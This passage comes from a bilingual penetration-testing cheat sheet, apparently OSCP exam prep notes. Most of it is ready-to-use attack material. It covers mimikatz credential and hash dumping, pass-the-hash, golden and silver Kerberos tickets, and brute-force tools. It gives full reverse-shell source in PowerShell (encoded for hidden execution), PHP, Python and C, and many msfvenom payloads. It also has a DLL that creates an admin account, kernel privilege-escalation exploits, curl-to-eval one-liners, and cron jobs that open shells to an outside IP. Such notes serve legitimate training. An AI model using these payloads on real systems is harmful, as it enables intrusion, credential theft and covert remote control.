powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes
```

```bash
#提升权限
privilege::debug

#抓取密码
sekurlsa::logonpasswords

# 读取域控中域成员Hash
#提升权限
privilege::debug

抓取密码
lsadump::lsa /patch

# 通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：
#获取所有域用户
lsadump::dcsync /domain:test.com /all /csv

#指定获取某个用户的hash
lsadump::dcsync /domain:test.com /user:test


# 哈希传递攻击PTH
#使用administrator用户的NTLM哈希值进行攻击
sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9

#使用xie用户的NTLM哈希值进行攻击
sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9

> 只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。

# 域环境
# MSF进行哈希传递
msf > use  exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set lhost 192.168.10.27
msf exploit(psexec) > set rhost 192.168.10.14
msf exploit(psexec) > set smbuser Administrator
msf exploit(psexec) > set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   #这里LM和NTLM我们已经获取到了
msf exploit(psexec) > exploit 

# 黄金票据
# 首先获取krbtgt的用户hash:
mimikatz "lsadump::dcsync /domain:xx.com /user:krbtgt"

# 利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：
kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi

#导入刚才生成的票据
kerberos::ptt test.kiribi

#导入成功后可获取域管权限
dir \\dc.abc.com\c$

# 白银票据
黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信
白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信

#在域控上导出 DC$ 的 HASH
mimikatz log "privilege::debug" "sekurlsa::logonpasswords"

#利用 DC$ 的 Hash制作一张 cifs 服务的白银票据
kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt

#cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统
dir \\DC.ABC.COM\C$
```

## Wordlist

```bash
# https://github.com/xajkep/wordlists.git
```

## Common Password

### Hydra

```bash
hydra [protocol]://[Target IP_ADDRESS] [Username txt file] [Password txt file]
```

### Medusa

```bash
medusa -h [Target IP_ADDRESS] -u [Username txt file] -P [Password txt file] -M [protocol]
```

## Burp force password

### John the Ripper&#x20;

```bash
john password hash file
```

## Hashcat

```bash
hashcat -m [password hash category] [password hash file] [dictionary]
```

## RainbowCrack

```bash
rtgen [Rainbow Table File Name] [Hash algorithm type] [Hash character set]
rcrack [Rainbow Table File Name] [Password File]


rtgen md5_loweralpha#1-8 0-7 a-z
rcrack md5_loweralpha#1-8 /etc/shadow
```

# Script

## Powershell encode script by python

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.225",9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

```

## PHP Reverse Shell

 ```php
 /*<?php /**/ error_reporting(0); $ip = '192.168.45.225'; $port = 9001; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```

## Python Reverse Shell #1

```python
import sys, select, tty, termios, socket
import _thread as thread
from sys import argv, stdout

class _GetchUnix:
    def __call__(self):
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(sys.stdin.fileno())
            ch = sys.stdin.read(1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        return ch


getch = _GetchUnix()

CONN_ONLINE = 1

def daemon(conn):
    while True:
        try:
            tmp = conn.recv(16)
            stdout.buffer.write(tmp)
            stdout.flush()
        except Exception as e:
            # print(e)
            CONN_ONLINE = 0
            # break

if __name__ == "__main__":
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.bind(('192.168.146.50', 4444))
    conn.listen(5)
    talk, addr = conn.accept()
    print("Connect from %s.\n" % addr[0])
    thread.start_new_thread(daemon, (talk,))
    while CONN_ONLINE:
        c = getch()
        if c:
            talk.send(bytes(c, encoding='utf-8'))

```

## Python Reverse Shell #2

```python
""" 
A simple reverse shell. In order to test the code you will need to run a server to listen to client's port.
You can try netcat command : nc -l -k  [port] (E.g nc -l -k  5002)	
"""


# Set the host and the port.
HOST = "192.168.45.224"
PORT = 8091

def connect((host, port)):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s

def wait_for_command(s):
	data = s.recv(1024)
	if data == "quit\n":
		s.close()
		sys.exit(0)
	# the socket died
	elif len(data)==0:
		return True
	else:
		# do shell command
		proc = subprocess.Popen(data, shell=True,
			stdout=subprocess.PIPE, stderr=subprocess.PIPE,
			stdin=subprocess.PIPE)
		stdout_value = proc.stdout.read() + proc.stderr.read()
		s.send(stdout_value)
		return False

def main():
	while True:
		socket_died=False
		try:
			s=connect((HOST,PORT))
			while not socket_died:
				socket_died=wait_for_command(s)
			s.close()
		except socket.error:
			pass
		time.sleep(5)

if __name__ == "__main__":
	import sys,os,subprocess,socket,time
	sys.exit(main())

```



## Use C file to generate exe file to reverse shell

```bash
x86_64-w64-mingw32-gcc reverse_c.c -o shellne.exe -lws2_32
```

```c
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "192.168.45.154"; 
char port[6] = "9001";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, sizeof(ip_addr), inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}

```

## Finding file/service

```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users -Include *.log,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```



## Find proof

```bash
Get-ChildItem -Path "c:\" -Recurse -Include local.txt,proof.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "`nFile: $($_.FullName)`nContent:"; Get-Content $_.FullName }

find /home /root -type f \( -name "proof.txt" -o -name "local.txt" \) -exec sh -c 'echo -e "\nFile: $1\nContent:"; cat "$1"' sh {} \;
```



##  msfvenom



### Windows

#### Reverse HTTPS

```bsah
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.225 LPORT=8443 -f exe -o meet.exe
```



#### Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```



#### Bind Shell

```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```



#### Create User

```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```



#### CMD Shell

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```



#### Execute Command

```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```



### Linux

#### Reverse Shell

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```



#### Bind Shell

```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```



### Web payloads

#### PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```



#### ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```



#### JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```



#### WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```



### Script Language

#### Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```

#### Bash

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```

#### Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```



# Privilege Escalation 

## Windows 

### Windows Vulnerability

```markdown
# Windows vulnerabilities:

## Windows XP:
CVE-2012-4349        Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root
CVE-2011-1345        Internet Explorer does not properly handle objects in memory - allows remote execution of code via object
CVE-2010-3138        EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse
CVE-2011-5046        EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution
CVE-2002-1214        ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS
CVE-2003-0352        ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service
CVE-2003-0533        MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service
CVE-2003-0719        ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow
CVE-2010-3970        ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution
CVE-2010-3147        EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse 
CVE-2003-0812        ms03_049_netapi - exploits a stack buffer overflow in the NetApi32 
CVE-2003-0818        ms04_007_killbill -  vulnerability in the bit string decoding code in the Microsoft ASN.1 library
CVE-2003-0822        ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051 
CVE-2004-0206        ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service

## Windows 7:
CVE-2014-4114        ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution
CVE-2015-0016        ms15_004_tswbproxy -  abuses a process creation policy in Internet Explorer's sandbox - code execution
CVE-2014-4113        ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution
CVE-2010-3227        EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution
CVE-2018-8494        remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input
CVE-2010-2744        EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation
CVE-2010-0017        ms10_006_negotiate_response_loop - exploits a denial of service flaw in the Microsoft Windows SMB client - DoS
CVE-2010-0232        ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit
CVE-2010-2550        ms10_054_queryfs_pool_overflow - exploits a denial of service flaw in the Microsoft Windows SMB service - DoS
CVE-2010-2568        ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload

## Windows 8:
CVE-2013-0008        ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation
CVE-2013-1300        ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation
CVE-2013-3660        ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption
CVE-2013-3918        ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution
CVE-2013-7331        ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine's filenames
CVE-2014-6324        ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation
CVE-2014-6332        ms14_064_ole_code_execution -  exploits the Windows OLE Automation array vulnerability 
CVE-2014-6352        ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution
CVE-2015-0002        ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation
   
## Windows 10:  
CVE-2015-1769        MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege
CVE-2015-2426        ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver 
CVE-2015-2479        MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege
CVE-2015-2513        MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution
CVE-2015-2423        MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure
CVE-2015-2431        MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution
CVE-2015-2441        MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution
CVE-2015-0057        exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine

Windows Server 2003:
CVE-2008-4114        ms09_001_write - exploits a denial of service vulnerability in the SRV.SYS driver - DoS
CVE-2008-4250        ms08_067_netapi  - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX 
CVE-2017-8487        allows an attacker to execute code when a victim opens a specially crafted file - remote code execution
```


### Use cpp to generate dll file to add user

```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
       i = system ("net user dave2 password123! /add");
       i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

###  Windows Local PE

https://github.com/CCob/SweetPotato

https://github.com/ohpe/juicy-potato

https://github.com/BeichenDream/GodPotato

https://github.com/ivanitlearning/Juicy-Potato-x86


## Linux PE

### 本地内核漏洞提权

#### CVE-2016-5195

```bash
# The program was successfully used with:
# https://github.com/gbonacini/CVE-2016-5195.git
RHEL7 Linux x86_64;
RHEL4 (4.4.7-16, with "legacy" version)
Debian 7 ("wheezy");
Ubuntu 14.04.1 LTS
Ubuntu 14.04.5 LTS
Ubuntu 16.04.1 LTS
Ubuntu 16.10
Linux Mint 17.2
# and compiled with:
clang version 4.0.0;
gcc version 6.2.0 20161005 (Ubuntu 6.2.0-5ubuntu12)
gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.1)
gcc version 4.8.5 20150623 (Red Hat 4.8.5-4) (GCC);
gcc version 4.8.4 (Ubuntu 4.8.4);
gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1)
gcc version 4.7.2 (Debian 4.7.2-5);
gcc version 4.4.7 (with "legacy" version)
```

#### CVE-2019-13272

```bash
# https://github.com/oneoy/CVE-2019-13272
git clone https://github.com/oneoy/CVE-2019-13272.git
# or
wget https://raw.githubusercontent.com/jas502n/CVE-2019-13272/master/CVE-2019-13272.c
cd CVE-2019-13272
gcc -s CVE-2019-13272.c -o pwned
```

#### Changed dirty

```bash
# https://github.com/Rvn0xsy/linux_dirty.git
# Compile with:
#   gcc -pthread dirty.c -o dirty -lcrypt
# Then run the newly create binary by either doing:
#   "./dirty"
#
# Afterwards, you can either "su rooter" or "ssh rooter@..."
# DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
#   mv /tmp/passwd.bak /etc/passwd
# Default Password: Hello@World
#默认添加用户 rooter 密码 Hello@World
```

#### dirty cow official

```bash
## https://github.com/dirtycow/dirtycow.github.io.git
uname -a 
gcc -pthread dirtyc0w.c -o dirty -lcrypt
./dirty password
```

#### dirtycow

```bash
# https://github.com/firefart/dirtycow.git
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
# or
 ./dirty my-new-password
# Afterwards, you can either su firefart or ssh firefart@...
# DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
mv /tmp/passwd.bak /etc/passwd
```

#### DirtyPipe

```bash
# https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
./compile.sh
./exploit
```

#### Ubuntu OverlayFS Local Privesc

```bash
# Affected Versions
# https://github.com/briskets/CVE-2021-3493.git
Ubuntu 20.10
Ubuntu 20.04 LTS
Ubuntu 19.04
Ubuntu 18.04 LTS
Ubuntu 16.04 LTS
Ubuntu 14.04 ESM

gcc exploit.c -o exploit
./exploit
```

#### CVE-2021-4034

```bash
# https://github.com/berdav/CVE-2021-4034.git

# If the exploit is working you'll get a root shell immediately:
vagrant@ubuntu-impish:~/CVE-2021-4034$ make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp /usr/bin/true GCONV_PATH=./pwnkit.so:.
vagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034
# whoami
root
# exit

#-----------------------------------------------------

# Updating polkit on most systems will patch the exploit, therefore you'll get the usage and the program will exit:
vagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
vagrant@ubuntu-impish:~/CVE-2021-4034$


# Dry Run
# To not execute a shell but just test if the system is vulnerable compile the dry-run target.
# If the program exit printing "root" it means that your system is vulnerable to the exploit.
vagrant@ubuntu-impish:~/CVE-2021-4034$ make dry-run
...
vagrant@ubuntu-impish:~/CVE-2021-4034$ dry-run/dry-run-cve-2021-4034
root
vagrant@ubuntu-impish:~/CVE-2021-4034$ echo $?
1

# If your system is not vulnerable it prints an error and exit.
vagrant@ubuntu-impish:~/CVE-2021-4034$ dry-run/dry-run-cve-2021-4034
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
vagrant@ubuntu-impish:~/CVE-2021-4034$ echo $?
0
# One-liner commands
eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
# example
vagrant@ubuntu-impish:~/CVE-2021-4034$ whoami
vagrant
vagrant@ubuntu-impish:~/CVE-2021-4034$ eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
# whoami
root
```

### SUID提权

#### SUID check

```bash
# https://github.com/Jewel591/suidcheck.git
./suidcheck.sh
```

#### 查找符合条件的文件

```bash
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;
```

#### 查看常见的可以提权程序

```bash
nmap vim find Bash More Less Nano cp netcat
```

#### 计划任务提权

```bash
#当 /bin/sh指向/bin/dash的时候(ubuntu默认这样，当前的靶机也是这样)，反弹shell用bash的话得这样弹： 
* * * * * root bash -c "bash -i >&/dev/tcp/106.13.124.93/2333 0>&1" # 这样弹shell的时候不知道为什么很慢，耐心等等
*/1 * * * * root perl -e 'use Socket;$i="106.13.124.93";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 提权辅助

#### LES

```bash
# wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

#### Linpeas

```bash
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
```

#### pspy

```bash
# https://github.com/DominicBreuker/pspy
```



# Information Collection

## Nmap

```markdown
# Nmap scan the network, listing machines that respond to ping
nmap -sP 10.0.0.0/24  

# A full TCP port scan using with service version detection - T1-T5 is the speed of the scan
nmap -p 1-65535 -sV -sS -T4 target  

# Prints verbose output, runs stealth syn scan, T4 timing, OS and version detection + traceroute and scripts against target services.
nmap -v -sS -A -T4 target

# Prints verbose output, runs stealth syn scan, T5 timing, OS and version detection + traceroute and scripts against target services.
nmap -v -sS -A -T5 target

# Prints verbose output, runs stealth syn scan, T5 timing, OS and version detection.
nmap -v -sV -O -sS -T5 target

# Prints verbose output, runs stealth syn scan, T4 timing, OS and version detection + full port range scan.
nmap -v -p 1-65535 -sV -O -sS -T4 target

# Prints verbose output, runs stealth syn scan, T5 timing, OS and version detection + full port range scan.
nmap -v -p 1-65535 -sV -O -sS -T5 target

# Nmap scan from file
nmap -iL ip-addresses.txt

# Nmap Netbios Examples
## Find all Netbios servers on subnet
nmap -sV -v -p 139,445 10.0.0.1/24

## Nmap display Netbios name
nmap -sU --script nbstat.nse -p 137 target

## Nmap check if Netbios servers are vulnerable to MS08-067
nmap --script-args=unsafe=1 --script  smb-check-vulns.nse -p 445 target
```



## ffuf

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://xxx.xxx.xxx.xxx/console/file.php?FUZZ=/etc/passwd" -fs 0
```



## Searchsploit

```bash
searchsploit
1.-c --case 搜索时区分大小写，默认不区分大小写

2.-e --exact 精确搜索，比如：搜索“ WordPress 4.1”时，结果绝对不会出现 “WordPress Core 4.1”

3.-s --strict  精确搜索，输入值必须存在

4.-t --tittle 搜索exploit标题

5.--exclude 从结果中删除值

# example
searchsploit mysql/searchsploit mysql -c # 搜索包含mysql的漏洞/过滤大写
searchsploit  mysql 5.5/searchsploit  mysql 5.5 -s # 搜索包含mysql 5.5/过滤包含5.6<5.7这种类型
searchsploit smb windows remote/searchsploit smb windows remote | grep rb # 搜索包含smb windows remote的漏洞/从结果中再筛选rb文件
```



## Nikto

```bash
nikto -h IP_ADDRESS
```

## gobuster

```bash
apt-get install gobuster
gobuster dir -u http://IP_ADDRESS/ -w /usr/share/wordlists/dirb/big.txt -x php
```

## dirb

```bash
dirb IP_ADDRESS/Domain
```

## diresarch

```bash
dirsearch -u IP_ADDRESS/Domain
```

## Wfuzz

```bash
wfuzz -u  IP_ADDRESS/Domain -w /usr/share/dirb/wordlists/common.txt --hc 400,404,403
```

## Metasploit

```bash
use auxiliary/scanner/http/dir_scanner
set rhosts Domain/IP_ADDRESS
set path WEB_PATH
set dictionary /usr/share/dirb/wordlists/common.txt
run
```

## Dirmap

```bash
# https://github.com/H4ckForJob/dirmap.git
git clone https://github.com/H4ckForJob/dirmap.git && cd dirmap && python3 -m pip install -r requirement.txt
# Single Target, default: http
python3 dirmap.py -i https://target.com -lcf
# Range
python3 dirmap.py -i 192.168.1.1-192.168.1.100 -lcf
# File Read
python3 dirmap.py -iF targets.txt -lcf
```

## webdirscan

```bash
# https://github.com/TuuuNya/webdirscan.git
git clone https://github.com/Strikersb/webdirscan.git
pip install requests
usage: webdirscan.py [-h] [-d SCANDICT] [-o SCANOUTPUT] [-t THREADNUM]
                     scanSite

positional arguments:
  scanSite              The website to be scanned

optional arguments:
  -h, --help            show this help message and exit
  -d SCANDICT, --dict SCANDICT # Dictionary for scanning
  -o SCANOUTPUT, --output SCANOUTPUT # Results saved files
  -t THREADNUM, --thread THREADNUM # Number of threads running the program
```

## wordpress
```bash
wpscan --url http://xxx --enumerate p --plugins-detection aggressive -o filename
wpscan -u IP_ADDRESS
wpscan -u IP_ADDRESS -e u vp # 列出用户名列表
wpscan -u IP_ADDRESS -e u --wordlist /path/wordlist.txt  # 为WPScan指定一个wordlist文件，使用--wordlist <path to file>选项
```

# Proxy

## Use chisel to access internal network

### Client

```powershell
.\chisel.exe client --max-retry-count 1 192.168.45.xxx:8081 R:socks
```

### Server

```bash
./chiselexe server -p 8081 --reverse
```



## Use ligolo-ng to access internal network

### 1. kali

```bash
┌──(aaron㉿aaron)-[~/Desktop/script/ligolo/ligolo_proxy_linux]
└─$ sudo ip tuntap add user aaron mode tun ligolo && sudo ip link set ligolo up
                                                                                                              
┌──(aaron㉿aaron)-[~/Desktop/script/ligolo/ligolo_proxy_linux]
└─$ sudo ./proxy -selfcert                                                     
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:11601  
```

### 2. Windows

```powershell
PS C:\users\web_svc> iwr -uri http://192.168.45.210:8000/agent.exe -o agent.exe
PS C:\users\web_svc> .\agent -connect 192.168.45.210:11601 -ignore-cert

```



### 3. kali

```bash
┌──(aaron㉿aaron)-[~/Desktop]
└─$ sudo ip route add 10.10.94.0/24 dev ligolo                              
[sudo] password for aaron: 

ligolo-ng » session
Specify a session : 1 - OSCP\web_svc@MS01 - 192.168.204.147:62816
[Agent : OSCP\web_svc@MS01] » start
[Agent : OSCP\web_svc@MS01] » INFO[0085] Starting tunnel to OSCP\web_svc@MS01         


```



# Linux Shell escalate

```bash
which python python2 python3
python3 -c 'import pty;pty.spawn("/bin/bash")';
python -c 'import pty;pty.spawn("/bin/bash")';

export SHELL=bash
export TERM=xterm-256color #允许 clear，并且有颜色

#ctrl+z
stty raw -echo;fg
```





# Refer

[RustyShackleford221/OSCP-Prep](https://github.com/RustyShackleford221/OSCP-Prep)

[burntmybagel/OSCP](https://github.com/burntmybagel/OSCP-Prep)

[tr0nucf/OSCP-Prep](https://github.com/tr0nucf/OSCP-prep-1)

[PowerShell-Administration-Tools](https://github.com/zweilosec/PowerShell-Administration-Tools)

